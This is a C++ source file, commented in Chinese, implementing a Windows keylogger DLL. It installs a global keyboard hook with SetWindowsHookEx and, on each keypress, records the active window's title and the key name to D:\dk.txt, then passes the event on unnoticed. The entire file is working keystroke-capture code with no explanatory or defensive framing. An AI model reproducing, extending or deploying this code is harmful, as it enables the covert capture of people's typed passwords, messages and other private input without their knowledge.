#include "KEYHOOK.h"
#include <stdio.h>
#include <string>
#include <filesystem>
using namespace std;
BOOL InstallHook()
{
	g_hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, GetModuleHandle(L"KeyHook"), 0);
	if (g_hook == NULL)
	{
		return FALSE;
	}
	return TRUE;
}


BOOL UninstallHook()
{
	return UnhookWindowsHookEx(g_hook);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{


	//拿到当前操作窗口的句柄
	HWND hWnd = ::GetActiveWindow();  //拿当前活动窗口
	if (hWnd == NULL)
	{
		hWnd = ::GetForegroundWindow(); //拿顶层窗口
		if (hWnd == NULL)
		{
			return CallNextHookEx(g_hook, nCode, wParam, lParam);
		}
	}

	//拿标题
	char windowsTextBuff[256] = { 0 };
	GetWindowTextA(hWnd, windowsTextBuff, 255);

	//去掉不能拿的按键
	if (nCode < 0 || nCode == HC_NOREMOVE)
	{
		return CallNextHookEx(g_hook, nCode, wParam, lParam);  //让钩子往下传
	}

	if (lParam & 0x40000000) //键盘抬起
	{
		return CallNextHookEx(g_hook, nCode, wParam, lParam);
	}

	//获取按键
	char keyTextBuff[256] = { 0 };
	GetKeyNameTextA(lParam, keyTextBuff, 255);

	//打开文件
	FILE* fp = fopen("D:\\dk.txt", "a");
	if (fp == NULL)
	{
		return CallNextHookEx(g_hook, nCode, wParam, lParam);
	}

	char buff[256] = { 0 };
	sprintf_s(buff, "%s:%s\n", windowsTextBuff, keyTextBuff);

	fwrite(buff, 1, strlen(buff), fp);
	fclose(fp);

	

	return CallNextHookEx(g_hook, nCode, wParam, lParam);
}
